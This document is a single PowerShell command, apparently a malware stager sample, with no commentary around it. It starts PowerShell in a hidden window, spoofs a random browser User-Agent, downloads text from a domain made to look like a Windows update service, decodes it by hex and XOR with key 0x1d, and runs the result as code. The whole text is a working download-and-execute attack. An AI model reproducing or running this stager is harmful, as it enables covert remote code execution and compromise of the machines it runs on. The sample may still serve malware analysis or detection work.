C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden "$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');
$RandomUserAgent = $UserAgents | Get-Random;
$WebClient = New-Object System.Net.WebClient;
$WebClient.Headers.Add('User-Agent', $RandomUserAgent);
$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');
$vurnwos ='';
for($i=0;$i -le $boddmei.Length-2;$i=$i+2)
{   $bodms=$boddmei[$i]+$boddmei[$i+1];
    $decodedChar = [char]([convert]::ToInt16($bodms, 16));
    $xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);
    $vurnwos = $vurnwos + $xoredChar
};
Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));
Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));